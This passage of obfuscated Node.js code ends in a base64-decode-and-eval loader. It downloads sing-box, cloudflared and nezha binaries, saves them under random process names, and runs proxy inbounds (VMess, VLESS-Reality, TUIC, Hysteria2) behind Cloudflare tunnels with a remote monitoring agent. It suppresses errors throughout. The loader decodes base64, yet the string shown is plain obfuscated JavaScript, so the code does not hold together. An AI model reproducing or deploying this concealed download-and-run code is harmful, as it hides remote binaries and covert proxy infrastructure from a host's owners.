_0x1a7e9c=path['join'](WORK_DIR,_0x61ff95(0x1b3)+crypto[_0x61ff95(0x237)](0x4)[_0x61ff95(0x18a)]('hex')+_0x61ff95(0x1a9)),_0x5778a8=spawn(_0x28b4df,[_0x61ff95(0x1ac),_0x61ff95(0x217),_0x61ff95(0x242),_0x61ff95(0x1e0)+_0x568441],{'stdio':[_0x61ff95(0x23f),_0x61ff95(0x267),_0x61ff95(0x267)]}),_0x2fedf6=fs[_0x61ff95(0x1f8)](_0x1a7e9c);_0x5778a8[_0x61ff95(0x243)][_0x61ff95(0x267)](_0x2fedf6),_0x5778a8['stderr'][_0x61ff95(0x267)](_0x2fedf6),_0x5778a8['on']('error',()=>{}),_0x5778a8['on'](_0x61ff95(0x26f),_0x3ad527=>{}),setTimeout(()=>{const _0x39fa73=_0x61ff95;try{const _0x1ed990=fs['readFileSync'](_0x1a7e9c,_0x39fa73(0x1f3)),_0xc9240e=_0x1ed990[_0x39fa73(0x205)](/https:\/\/([^\/\s]+\.trycloudflare\.com)/);if(_0xc9240e){CONFIG[_0x39fa73(0x1de)]=_0xc9240e[0x1];try{fs[_0x39fa73(0x18d)](_0x1a7e9c);}catch(_0x1d778e){}return _0x490118(_0x5778a8);}}catch(_0x368c90){}_0x5778a8[_0x39fa73(0x1dd)]();try{fs[_0x39fa73(0x18d)](_0x1a7e9c);}catch(_0x4ac702){}_0x1dcc98===0x2&&_0x490118(null);},0x2710);}});}async function generateRealityKeys(_0x1d081f){const _0x11e836=_0x368d55;if(!CONFIG[_0x11e836(0x1c3)]||CONFIG[_0x11e836(0x1e7)]&&CONFIG[_0x11e836(0x201)])return;return new Promise(_0x280370=>{const _0x2fa0c5=_0x11e836,_0x2ca85b=spawn(_0x1d081f,[_0x2fa0c5(0x20a),_0x2fa0c5(0x25f)]);let _0xa76403='';_0x2ca85b[_0x2fa0c5(0x243)]['on'](_0x2fa0c5(0x26b),_0x245194=>{const _0x2477e7=_0x2fa0c5;_0xa76403+=_0x245194[_0x2477e7(0x18a)]();}),_0x2ca85b['on']('close',_0x16f387=>{const _0x1fdcac=_0x2fa0c5;if(_0x16f387===0x0&&_0xa76403){const _0x5d4af6=_0xa76403['match'](/PrivateKey:\s*(\S+)/),_0xe673c8=_0xa76403[_0x1fdcac(0x205)](/PublicKey:\s*(\S+)/);_0x5d4af6&&_0xe673c8&&(CONFIG[_0x1fdcac(0x1e7)]=_0x5d4af6[0x1],CONFIG['REALITY_PUBLIC_KEY']=_0xe673c8[0x1]);}_0x280370();}),_0x2ca85b['on'](_0x2fa0c5(0x1c6),()=>{_0x280370();});});}async function generateSingBoxConfig(){const _0x11f420=_0x368d55,_0x4657d9=[];CONFIG[_0x11f420(0x20d)]&&_0x4657d9[_0x11f420(0x248)]({'type':_0x11f420(0x1b6),'tag':_0x11f420(0x1a6),'listen':'0.0.0.0','listen_port':parseInt(CONFIG[_0x11f420(0x20d)]),'users':[{'password':CONFIG[_0x11f420(0x235)]}],'tls':{'enabled':!![],'server_name':CONFIG[_0x11f420(0x1fa)],'insecure':!![],'alpn':['h3']}});CONFIG[_0x11f420(0x22b)]&&_0x4657d9[_0x11f420(0x248)]({'type':_0x11f420(0x1d2),'tag':_0x11f420(0x24a),'listen':'0.0.0.0','listen_port':parseInt(CONFIG[_0x11f420(0x22b)]),'users':[{'uuid':CONFIG[_0x11f420(0x236)],'alterId':0x0}],'transport':{'type':'ws','path':CONFIG[_0x11f420(0x21d)],'headers':{}}});CONFIG[_0x11f420(0x1c3)]&&_0x4657d9['push']({'type':_0x11f420(0x1a3),'tag':_0x11f420(0x1ff),'listen':_0x11f420(0x190),'listen_port':parseInt(CONFIG[_0x11f420(0x1c3)]),'users':[{'uuid':CONFIG[_0x11f420(0x236)],'flow':_0x11f420(0x1d1)}],'tls':{'enabled':!![],'server_name':CONFIG[_0x11f420(0x1c2)],'reality':{'enabled':!![],'handshake':{'server':CONFIG[_0x11f420(0x1c2)],'server_port':0x1bb},'private_key':CONFIG[_0x11f420(0x1e7)],'short_id':[CONFIG[_0x11f420(0x1c0)]]}}});CONFIG[_0x11f420(0x1ca)]&&_0x4657d9[_0x11f420(0x248)]({'type':_0x11f420(0x262),'tag':_0x11f420(0x1d4),'listen':_0x11f420(0x190),'listen_port':parseInt(CONFIG[_0x11f420(0x1ca)]),'users':[{'uuid':CONFIG['TUIC_UUID'],'password':CONFIG[_0x11f420(0x23c)]}],'congestion_control':_0x11f420(0x1e6),'auth_timeout':'3s','zero_rtt_handshake':![],'heartbeat':_0x11f420(0x230),'tls':{'enabled':!![],'server_name':CONFIG['HY2_SNI'],'insecure':!![],'alpn':['h3']}});const _0x141926={'log':{'level':'warn','timestamp':!![]},'dns':{'servers':[{'tag':_0x11f420(0x21e),'address':'8.8.8.8'},{'tag':_0x11f420(0x1d3),'address':'1.1.1.1'}],'final':_0x11f420(0x21e)},'inbounds':_0x4657d9,'outbounds':[{'type':'direct','tag':'direct'},{'type':_0x11f420(0x198),'tag':_0x11f420(0x198)}],'route':{'rules':[{'ip_is_private':!![],'outbound':'direct'}],'final':_0x11f420(0x26d)},'experimental':{'cache_file':{'enabled':!![],'path':path[_0x11f420(0x211)](WORK_DIR,_0x11f420(0x23b))}}},_0x211fec=path[_0x11f420(0x211)](WORK_DIR,_0x11f420(0x240));return fs[_0x11f420(0x1ba)](_0x211fec,JSON[_0x11f420(0x1f6)](_0x141926,null,0x2)),_0x211fec;}function generateLinks(_0xcf8def){const _0xd22be1=_0x368d55,_0x29b667=[];CONFIG[_0xd22be1(0x20d)]&&_0x29b667[_0xd22be1(0x248)]({'protocol':_0xd22be1(0x18c),'url':_0xd22be1(0x21f)+CONFIG[_0xd22be1(0x235)]+'@'+_0xcf8def+':'+CONFIG[_0xd22be1(0x20d)]+_0xd22be1(0x22e)+CONFIG[_0xd22be1(0x1fa)]+_0xd22be1(0x269)});if(CONFIG[_0xd22be1(0x22b)]){const _0x39e8e3={'v':'2','ps':_0xd22be1(0x21a),'add':CONFIG[_0xd22be1(0x1a5)],'port':'443','id':CONFIG[_0xd22be1(0x236)],'aid':'0','scy':'auto','net':'ws','type':_0xd22be1(0x202),'host':CONFIG[_0xd22be1(0x1de)],'path':CONFIG[_0xd22be1(0x21d)],'tls':_0xd22be1(0x1ea),'sni':CONFIG[_0xd22be1(0x1de)],'alpn':'','fp':_0xd22be1(0x245)};_0x29b667[_0xd22be1(0x248)]({'protocol':_0xd22be1(0x260),'url':'vmess://'+Buffer['from'](JSON[_0xd22be1(0x1f6)](_0x39e8e3))[_0xd22be1(0x18a)](_0xd22be1(0x1ec))});}return CONFIG[_0xd22be1(0x1c3)]&&_0x29b667[_0xd22be1(0x248)]({'protocol':_0xd22be1(0x264),'url':'vless://'+CONFIG[_0xd22be1(0x236)]+'@'+_0xcf8def+':'+CONFIG[_0xd22be1(0x1c3)]+_0xd22be1(0x1ef)+CONFIG[_0xd22be1(0x1c2)]+_0xd22be1(0x210)+CONFIG[_0xd22be1(0x201)]+_0xd22be1(0x24b)+CONFIG[_0xd22be1(0x1c0)]+'&type=tcp#REALITY'}),CONFIG[_0xd22be1(0x1ca)]&&_0x29b667[_0xd22be1(0x248)]({'protocol':_0xd22be1(0x1ee),'url':'tuic://'+CONFIG[_0xd22be1(0x238)]+':'+CONFIG[_0xd22be1(0x23c)]+'@'+_0xcf8def+':'+CONFIG['TUIC_PORT']+_0xd22be1(0x1a0)}),_0x29b667;}function cleanup(){const _0x567e2f=_0x368d55;processManager[_0x567e2f(0x219)](),setTimeout(()=>{const _0x2a97a5=_0x567e2f;process[_0x2a97a5(0x26f)](0x0);},0x2710);}function createServiceStarters(){const _0x300a20=_0x368d55,_0xa4a801={};(CONFIG[_0x300a20(0x20d)]||CONFIG[_0x300a20(0x22b)]||CONFIG[_0x300a20(0x1c3)]||CONFIG[_0x300a20(0x1ca)])&&(_0xa4a801['singbox']=async()=>{const _0x2af548=_0x300a20;try{await generateRealityKeys(binaryFiles[_0x2af548(0x225)]);const _0x1140b8=await generateSingBoxConfig(),_0x4055d5=spawn(binaryFiles['singbox'],['check','-c',_0x1140b8],{'stdio':_0x2af548(0x23f)});await new Promise((_0x2f3a52,_0x4a0f18)=>{const _0x3b2d3f=_0x2af548;_0x4055d5['on']('close',_0x46d757=>{const _0x4049d3=_0x47dc;_0x46d757===0x0?_0x2f3a52():_0x4a0f18(new Error(_0x4049d3(0x226)+_0x46d757));}),_0x4055d5['on'](_0x3b2d3f(0x1c6),_0x4a0f18);});const _0x15772c=spawn(binaryFiles[_0x2af548(0x225)],[_0x2af548(0x231),'-c',_0x1140b8],{'stdio':[_0x2af548(0x23f),'pipe',_0x2af548(0x267)]});return _0x15772c;}catch(_0x16a2bc){throw new Error(_0x2af548(0x1cf)+_0x16a2bc[_0x2af548(0x212)]);}});if(CONFIG[_0x300a20(0x191)])_0xa4a801[_0x300a20(0x234)]=async()=>{const _0x29c42e=_0x300a20,_0x1f1224=spawn(binaryFiles[_0x29c42e(0x234)],[_0x29c42e(0x1ac),_0x29c42e(0x270),_0x29c42e(0x208),_0x29c42e(0x1b5),_0x29c42e(0x1d6),_0x29c42e(0x224),'us',_0x29c42e(0x217),_0x29c42e(0x231),'--token',CONFIG['C_T'],_0x29c42e(0x242),_0x29c42e(0x1e0)+CONFIG[_0x29c42e(0x26e)]],{'stdio':[_0x29c42e(0x23f),_0x29c42e(0x267),_0x29c42e(0x267)]});return _0x1f1224;};else CONFIG[_0x300a20(0x22b)]&&(_0xa4a801['cloudflared']=async()=>{const _0x4c988b=_0x300a20;return await startTempTunnel(binaryFiles[_0x4c988b(0x234)],CONFIG[_0x4c988b(0x26e)]);});return CONFIG['N_S']&&CONFIG[_0x300a20(0x1df)]&&(_0xa4a801[_0x300a20(0x1d8)]=async()=>{const _0x11d8a7=_0x300a20,_0x5401e2=['-s',CONFIG[_0x11d8a7(0x1cc)]+':'+CONFIG['N_P'],'-p',CONFIG[_0x11d8a7(0x1df)],_0x11d8a7(0x20b),'3','--disable-auto-update'];CONFIG[_0x11d8a7(0x18e)][_0x11d8a7(0x244)](_0x11d8a7(0x250))&&_0x5401e2[_0x11d8a7(0x248)](_0x11d8a7(0x250));const _0x5a3c4e=spawn(binaryFiles[_0x11d8a7(0x1d8)],_0x5401e2,{'stdio':['ignore',_0x11d8a7(0x267),_0x11d8a7(0x267)]}),_0x2fecb1=path[_0x11d8a7(0x211)](WORK_DIR,_0x11d8a7(0x255)),_0x1f7438=fs[_0x11d8a7(0x1f8)](_0x2fecb1);return _0x5a3c4e[_0x11d8a7(0x243)][_0x11d8a7(0x267)](_0x1f7438),_0x5a3c4e[_0x11d8a7(0x1e8)][_0x11d8a7(0x267)](_0x1f7438),_0x5a3c4e;}),_0xa4a801;}function handleWebSocketUpgrade(_0x46155b,_0x2489ea,_0x6f0fb8){const _0x9c45e6=_0x368d55,_0x23b313=net['createConnection'](CONFIG[_0x9c45e6(0x22b)],_0x9c45e6(0x1ce));_0x23b313['on'](_0x9c45e6(0x20e),()=>{const _0xe1c124=_0x9c45e6,_0x3609d0=_0x46155b[_0xe1c124(0x20c)]+'\x20'+_0x46155b[_0xe1c124(0x19b)]+_0xe1c124(0x24e),_0x4d5f2f=Object[_0xe1c124(0x214)](_0x46155b[_0xe1c124(0x196)])[_0xe1c124(0x1cd)](_0x595c8b=>_0x595c8b+':\x20'+_0x46155b[_0xe1c124(0x196)][_0x595c8b])[_0xe1c124(0x211)]('\x0d\x0a');_0x23b313[_0xe1c124(0x220)](_0x3609d0+_0x4d5f2f+_0xe1c124(0x24f)),_0x2489ea[_0xe1c124(0x267)](_0x23b313),_0x23b313[_0xe1c124(0x267)](_0x2489ea);}),_0x23b313['on'](_0x9c45e6(0x1c6),()=>_0x2489ea[_0x9c45e6(0x1b1)]()),_0x2489ea['on'](_0x9c45e6(0x1c6),()=>_0x23b313[_0x9c45e6(0x239)]());}const server=http[_0x368d55(0x200)](async(_0x5cd34a,_0x307e39)=>{const _0xa0b144=_0x368d55,{pathname:_0x1cd2a5}=new URL(_0x5cd34a[_0xa0b144(0x19b)],'http://'+_0x5cd34a['headers'][_0xa0b144(0x1c4)]);_0x307e39[_0xa0b144(0x1a2)](_0xa0b144(0x1da),_0xa0b144(0x25e));if(_0x1cd2a5==='/')_0x307e39['writeHead'](0xc8),_0x307e39[_0xa0b144(0x1b1)](HTML_TEMPLATES[_0xa0b144(0x207)]);else{if(_0x1cd2a5===_0xa0b144(0x1f9)||_0x1cd2a5==='/x'){const _0x484542=await getServerIP(),_0x3c89a5=generateLinks(_0x484542),_0x2278e8=processManager[_0xa0b144(0x1e1)]();_0x307e39[_0xa0b144(0x251)](0xc8),_0x307e39[_0xa0b144(0x1b1)](HTML_TEMPLATES[_0xa0b144(0x1b0)](_0x484542,_0x3c89a5,_0x2278e8));}else _0x1cd2a5===_0xa0b144(0x22a)?(_0x307e39[_0xa0b144(0x1a2)](_0xa0b144(0x1da),_0xa0b144(0x22d)),_0x307e39[_0xa0b144(0x251)](0xc8),_0x307e39[_0xa0b144(0x1b1)](JSON[_0xa0b144(0x1f6)]({'status':'ok','services':serviceStatus,'processes':processManager[_0xa0b144(0x1e1)]()}))):(_0x307e39[_0xa0b144(0x251)](0x194),_0x307e39[_0xa0b144(0x1b1)]('<h1>404\x20Not\x20Found</h1>'));}});server['on'](_0x368d55(0x1f4),handleWebSocketUpgrade);function setupHealthCheck(){const _0x426102=_0x368d55;setInterval(async()=>{const _0x1dcfef=_0x47dc,_0x2c8f37=createServiceStarters();for(const [_0x5daf38,_0x143dd1]of Object[_0x1dcfef(0x23a)](_0x2c8f37)){const _0x1b970c=serviceStatus[_0x5daf38],_0x10e170=processManager['processes'][_0x1dcfef(0x25b)](_0x5daf38);!_0x10e170&&(_0x1b970c===_0x1dcfef(0x1a8)||_0x1b970c===_0x1dcfef(0x1c6))&&await processManager['startProcess'](_0x5daf38,{'starter':_0x143dd1});}processManager[_0x1dcfef(0x23e)][_0x1dcfef(0x228)]((_0x4a7470,_0x3c9908)=>{const _0x28e0af=_0x1dcfef;_0x4a7470[_0x28e0af(0x1cb)][_0x28e0af(0x1f7)]&&(processManager[_0x28e0af(0x23e)][_0x28e0af(0x223)](_0x3c9908),serviceStatus[_0x3c9908]===_0x28e0af(0x1af)&&(serviceStatus[_0x3c9908]=_0x28e0af(0x1a8)));});},CONFIG[_0x426102(0x1bd)]);}async function main(){const _0x1228a=_0x368d55;server['listen'](CONFIG['PORT'],()=>{const _0x3a56eb=_0x47dc;serviceStatus[_0x3a56eb(0x252)]=_0x3a56eb(0x1af);});try{const _0x4b1d8d=process['arch']===_0x1228a(0x18b)?_0x1228a(0x204):process[_0x1228a(0x19f)]===_0x1228a(0x22f)?_0x1228a(0x22f):process[_0x1228a(0x26f)](0x1),_0x12ffc6=_0x4b1d8d===_0x1228a(0x22f);binaryFiles={'singbox':path['join'](WORK_DIR,getRandomProcessName()),'cloudflared':path[_0x1228a(0x211)](WORK_DIR,getRandomProcessName()),'nezha':path['join'](WORK_DIR,getRandomProcessName())};const _0x3adbc2={'singbox':_0x1228a(0x23d)+(_0x12ffc6?_0x1228a(0x241):''),'cloudflared':_0x1228a(0x229)+(_0x12ffc6?'-arm':''),'nezha':_0x1228a(0x1bc)+(_0x12ffc6?_0x1228a(0x241):'')},_0x53fde4=Object['entries'](binaryFiles)[_0x1228a(0x1fc)](([_0x515bbe,_0x69d4b3])=>!fs['existsSync'](_0x69d4b3));for(const [_0x5d9a2e,_0x3fa738]of _0x53fde4){try{await downloadBinary(_0x3adbc2[_0x5d9a2e],_0x3fa738);}catch(_0x1c9e96){throw _0x1c9e96;}}for(const [_0x51449c,_0x317e5e]of Object['entries'](binaryFiles)){if(!fs['existsSync'](_0x317e5e))throw new Error(_0x1228a(0x1d7)+_0x51449c+_0x1228a(0x1ed)+_0x317e5e);}const _0x268402=createServiceStarters();for(const [_0x173091,_0x4db177]of Object['entries'](_0x268402)){await processManager['startProcess'](_0x173091,{'starter':_0x4db177}),await new Promise(_0x20404f=>setTimeout(_0x20404f,0x7d0));}setupHealthCheck(),process['on']('SIGINT',cleanup),process['on']('SIGTERM',cleanup),process['on'](_0x1228a(0x1c8),_0x9aa9bf=>{cleanup();}),process['on'](_0x1228a(0x195),(_0x2304bb,_0x79c4e9)=>{});}catch(_0x47f7ac){process['exit'](0x1);}}main()[_0x368d55(0x1d0)](_0x580efd=>{const _0x1e2c1e=_0x368d55;process[_0x1e2c1e(0x26f)](0x1);});';
const code = Buffer.from(b, 'base64').toString();
eval(code);
